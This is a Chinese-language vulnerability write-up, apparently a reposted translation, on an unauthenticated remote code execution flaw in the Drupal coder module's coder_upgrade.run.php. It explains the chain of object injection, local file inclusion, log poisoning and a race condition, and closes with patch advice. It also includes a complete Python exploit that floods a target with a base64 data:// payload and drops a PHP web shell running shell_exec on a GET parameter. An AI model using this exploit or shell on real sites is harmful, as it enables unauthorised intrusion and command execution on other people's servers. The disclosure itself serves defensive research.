> 原文链接: https://www.anquanke.com//post/id/84432 


# Drupal coder module 存在未经身份验证的远程代码执行漏洞


                                阅读量   
                                **83060**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



 

[![](https://p3.ssl.qhimg.com/t016e2cf9555f472a17.jpg)](https://p3.ssl.qhimg.com/t016e2cf9555f472a17.jpg)



在审查编码器模块安全代码时，我在Drupal 安全咨询 （SA-CONTRIB-2016年-039 ）中发现一个未经身份验证的远程代码执行漏洞。漏洞影响Drupal 编码器模块的版本包括 7.x- 1.3 和 7.x -2.6以下的所有版本，而且利用这个漏洞都不需要启用 Drupal 编码器模块和模块。据报告有 4000 个左右的网站在使用此模块。

其实本质问题是该模块里面有危险的 PHP 脚本，它可以直接允许无任何身份验证访问。该脚本本意是为了修改 PHP 源代码，并不应该被发布。但从安全的角度来看，这个脚本写得也很差劲。开发人员 （这位开发者还写了一个"安全代码审查"模块） 并没有编写任何代码来保护或限制访问脚本。当我报告这一问题时，开发人员一直回避问题报告，并且坚称脚本运行一切正常！

简易版本

这个易受攻击的脚本可以在这个路径中看到（ coder/coder_upgrade/scripts/coder_upgrade.run.php），可以直接访问，并且不受任何内置于 Drupal 安全控件（例如身份验证和授权） 的限制。此脚本也几乎没有输入验证，因此漏洞百出，主要包括：

· PHP 对象注射

· 2009 年 6 月被弃用、2012 年 3 月完全从 PHP 中删除 的 PHP 的危险可变变量

· 目录遍历

· 本地文件录入

· 日志文件感染

通常本地文件和日志文件都可入侵就意味着可以进行远程代码执行，然而情况还不是那么简单。被感染的日志文件会在触发本地文件之前被覆盖，这样就可以执行日志文件中的代码了。

幸运的是，被感染日志文件的路径没变，请求也没有变化。多线程还意味着一台服务器线程的日志文件被感染之后，其他线程 CPU还有时间可以暂停，然后为第二个服务器恢复线程并清除日志文件，但是在本地文件还是包含漏洞的时候还是会导致远程代码执行。

RCE：前往代码执行

我是在审查各种 Drupal 插件安全漏洞时发现这一问题的。Drupal 插件的代码通常存放在带有扩展名.module 或 .inc的文件中。这样做的好处是如果有直接请求文件（例如扩展名为 .php），代码就不会执行，只有在 Drupal 具体包括相关文件的情况下才会执行 （因此代码将收到内置于 Drupal 的安全插件管制）。

许多模块都有.php 文件，但这些往往只包含函数和类定义，所以直接请求时并不会执行任何有意义的代码。在其他情况下，这些脚本可能会调用没有定义脚本是否可以直接访问的函数(例如 CMS Api)，这会导致在 PHP 错误和脚本终止。编码器模块含有184个 .php 文件，所以我写了一个脚本标记 PHP 文件，想要找出在直接要求/执行脚本时起到作用的文件。当我在编码器模块中执行此脚本时，发现了 coder/coder_upgrade/scripts/coder_upgrade.run.php。快速浏览一下这个文件可以发现大量可能执行的代码，而且并没有什么明显错误，所以它看起来就需要进行更深入的代码审查。

 

[![](https://p0.ssl.qhimg.com/t018332118dae4dc4dd.jpg)](https://p0.ssl.qhimg.com/t018332118dae4dc4dd.jpg)

下面是对 save_memory_usage()的调用，定义一个常数，调用一些 PHP 设置配置，并注册错误/异常处理程序。我们现在还不能控制脚本中的任何东西。

[![](https://p1.ssl.qhimg.com/t013012f860013dbb39.jpg)](https://p1.ssl.qhimg.com/t013012f860013dbb39.jpg)

下一步创建名为 $path 的变量并由稍后在脚本中定义的 extract_arguments() 函数返回的值初始化。如果 $path 是空，该脚本就会返回一条消息并终止，因此为了获得更多的代码我们需要将 $path 设置为一个非 null 值。

[![](https://p2.ssl.qhimg.com/t0106e11acf25fee6c9.jpg)](https://p2.ssl.qhimg.com/t0106e11acf25fee6c9.jpg)

[![](https://p0.ssl.qhimg.com/t0111a8416d9218898f.jpg)](https://p0.ssl.qhimg.com/t0111a8416d9218898f.jpg)

该脚本使用 file_get_contents()的给定路径读取文件，并将内容传递到unserialize()函数，将结果存储在名为 $parameters 的变量中。默认情况下 PHP 允许文件处理函数打开 Url （见'allow_url_fopen'） ，所以我们可以使用任意 URL ，让此脚本读取它并将返回的数据传递给 unserialize()。这件事是非常危险的，因为它可能会带来PHP 对象注入攻击，然而在这种情况没有非标准的 PHP 类可供攻击者进行注入攻击。现在我们可以控制 $parameters 变量的内容了。

需要指出的是，包括 file_get_contents()在内的 PHP 文件系统功能支持各种协议封装。特别值得注意的是数据: / / 协议，它允许数据用 base 64 编码，而且允许直接阅读。这意味着服务器不需要出站的 HTTP (S) 或 FTP 连接。

[![](https://p2.ssl.qhimg.com/t0113e8a51f616ce298.jpg)](https://p2.ssl.qhimg.com/t0113e8a51f616ce298.jpg)

上述 for 循环将 $parameters 变量视为数组，此循环执行之后我们可以通过改变$parameters 变量的位置来控制脚本中的每个变量。

[![](https://p1.ssl.qhimg.com/t017a91af62d87d6c8a.jpg)](https://p1.ssl.qhimg.com/t017a91af62d87d6c8a.jpg)

这种循环结合常量字符串和一个变量构造几个我们可以控制的路径，然后将每个路径传递到要执行每个文件的 PHP 代码指令。因为我们控制无需验证的$_coder_upgrade_modules_base 变量，所以我们可以控制有限的本地文件包含 (LFI) 漏洞。不幸的是要实现通过此 LFI bug 执行任意代码我们需要下列操作来控制本地文件路径结束︰

/coder/coder_upgrade/coder_upgrade.inc

/coder/coder_upgrade/includes/main.inc

/coder/coder_upgrade/includes/utility.inc

在 PHP 5.3.4 版本中（发布于 2010年 12 月）本来可以利用 PHP 中的文件路径截断来选择任意本地文件。所以执行任意代码在理论上是可行的。

[![](https://p1.ssl.qhimg.com/t017beaad43c080fc47.jpg)](https://p1.ssl.qhimg.com/t017beaad43c080fc47.jpg)

函数 coder_upgrade_memory_print() 写入了一些我们无法控制输出到 memory.txt的数据，之后我们控制这三个变量传递给 coder_upgrade_start() 所定义的文件 main.inc。

[![](https://p4.ssl.qhimg.com/t01b3ce5ef404b00870.jpg)](https://p4.ssl.qhimg.com/t01b3ce5ef404b00870.jpg)

如果 $usage 变量是一个数组，那么它就会通过implode()被转换为一个字符串，这样该数组的元素就可

以用新行字符连接在一起。生成的字符串会传递给在main.inc 文件中定义的

coder_upgrade_path_print()函数 ，在这种情况下有效地将给定的字符串写入到 memory.txt中去。因

为我们可以控制变量 $usage，所以我们现在可以在memory.txt插入任意数据，包括 PHP 代码。我们无

法直接在txt文件中执行任何注入代码，但是我们可以使用包含漏洞的一个本地文件（含有memory.txt）

执行代码。由于 NULL 字节文件路径截断漏洞，早期的 LFI 可以用在 PHP 5.3.4之后的版本中。

[![](https://p2.ssl.qhimg.com/t0115509c82e82aad9d.jpg)](https://p2.ssl.qhimg.com/t0115509c82e82aad9d.jpg)

函数coder_upgrade_memory_print()写入数据使得我们无法控制memory.txt文件。下面这三个变量，我们是通过coder_upgrade_start()也就是main.inc定义文件进行控制。

[![](https://p0.ssl.qhimg.com/t01a74f109480affcec.jpg)](https://p0.ssl.qhimg.com/t01a74f109480affcec.jpg)

传递给 coder_upgrade_start() 的三个参数必须是非空数组。然后在$upgrades 参数传递到 coder_upgrade_load_code() 之前清除几个日志文件。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01e7e539730a3bd181.jpg)

检测网站是否易受攻击

如果安装的编码器模块是7.x 1.3 或 7.x 2.6 之前的版本，那么该网站不管是否已启用编码器模块，都是易受未经身份验证的远程代码执行攻击的。

可以通过请求响应来确定是否是易受攻击的网站。如果该脚本返回的确切字符串文件参数不是参数文件，那么该网站就是危险的。 此脚本可能的各种安装路径如下︰



```
[drupal-root]/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php
[drupal-root]/sites/all/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php
[drupal-root]/sites/default/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php
[drupal-root]/sites/[site-name]/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php
```





 [Drupal- root] 是Drupal可以到达的URL ，[站点名称] 是用来标识单个站点名称的。

已经发布Nessus 插件来检测此漏洞，但它目前似乎只能检查前两个默认安装路径。

开发

下面有我的概念证明。它生成多个线程，将有效负载反复发送到脆弱的脚本直到触发器启用，服务器中还写入了最小的 PHP 命令外壳程序。

```
import base64
import urllib
import threading
import sys
 
#Check for target parameter
if len(sys.argv) != 2:
 print "Usage: drupal-coder-shellupload.py &lt;drupal-root&gt;"
 print "  e.g. drupal-coder-shellupload.py http://www.somedrupalsite.org"
 sys.exit()
 
#Target URL - must point at the base of the Drupal installation
target = sys.argv[1]
if target[-1] == "/":
 target = target[:-1] #Strip trailing slash
 
#The payload generated by constructing our $parameters array in PHP and serializing it:
# a:7:`{`s:5:"paths";a:3:`{`s:10:"files_base";s:28:"../../../../../default/files";s:14:"libraries_base";s:21:"../../../../libraries";s:12:"modules_base";s:8:"../../..";`}`s:9:"variables";a:0:`{``}`s:11:"theme_cache";s:0:"";s:8:"upgrades";a:1:`{`s:20:"race-execpoisonedlog";a:3:`{`s:6:"module";s:20:"race-execpoisonedlog";s:4:"path";s:42:"../../../../../default/files/coder_upgrade";s:5:"files";a:1:`{`i:0;s:10:"memory.txt";`}``}``}`s:10:"extensions";a:1:`{`s:11:"placeholder";s:0:"";`}`s:5:"items";a:1:`{`s:11:"placeholder";s:0:"";`}`s:5:"usage";s:116:"&lt;?php file_put_contents('x.php','&lt;?php print nl2br(htmlentities(shell_exec($_GET[1]))); ?&gt;');chmod('x.php',0755); ?&gt;";`}`
#We can pass this directly to the vulnerable script by using the data:// protocol by base 64 encoding it...
payload = "data://text/plain;base64," + base64.b64encode("a:7:`{`s:5:"paths";a:3:`{`s:10:"files_base";s:28:"../../../../../default/files";s:14:"libraries_base";s:21:"../../../../libraries";s:12:"modules_base";s:8:"../../..";`}`s:9:"variables";a:0:`{``}`s:11:"theme_cache";s:0:"";s:8:"upgrades";a:1:`{`s:20:"race-execpoisonedlog";a:3:`{`s:6:"module";s:20:"race-execpoisonedlog";s:4:"path";s:42:"../../../../../default/files/coder_upgrade";s:5:"files";a:1:`{`i:0;s:10:"memory.txt";`}``}``}`s:10:"extensions";a:1:`{`s:11:"placeholder";s:0:"";`}`s:5:"items";a:1:`{`s:11:"placeholder";s:0:"";`}`s:5:"usage";s:116:"&lt;?php file_put_contents('x.php','&lt;?php print nl2br(htmlentities(shell_exec($_GET[1]))); ?&gt;');chmod('x.php',0755); ?&gt;";`}`")
 
#Check whether the exploit has succeeded (i.e. whetherr the dropped shell exists)
def checkSuccess():
 result = False
 urlReader = urllib.urlopen(target + "/sites/all/modules/coder/coder_upgrade/scripts/x.php")
 if urlReader.getcode() == 200:
  result = True
 urlReader.close()
 return result
 
#Attack thread
def attackThread():
 #Poison memory.txt and trigger the LFI until the race condition triggers and the shell is dropped
 while checkSuccess() == 0:
  urlReader = urllib.urlopen(target + "/sites/all/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php?" + urllib.urlencode(`{`"file": payload`}`))
  response = urlReader.read()
  urlReader.close()
 
#Spawn a load of threads in an attempt to trigger the race condition, then wait for them all to complete
attackThreads = []
for i in range(50):
 attackThreads.append(threading.Thread(target = attackThread))
 attackThreads[i].start()
for i in range(50):
 attackThreads[i].join()
 
#Done.
print "Exploit successful!"
print "A command shell should be available now at " target + "/sites/all/modules/coder/coder_upgrade/scripts/x.php"
print "Pass commands to execute via the '1' GET parameter e.g. ?1=ls"
```





在安全咨询发布之后，一位名叫Mehmet Ince (@mdisec)的研究员对该模块做了进一步分析（文章发表在土耳其），并且利用 shell_exec() 的调用发现了一条更好地到达RCE的路径。<br>

修复

脆弱的 PHP 脚本存在固有的危险性，本不应该发布到服务器中，所以理想情况下应该从所有的生产服务器上删除编码器模块；或者将该模块更新到版本 7.x 版-1.3 或 7.x 2.6 。


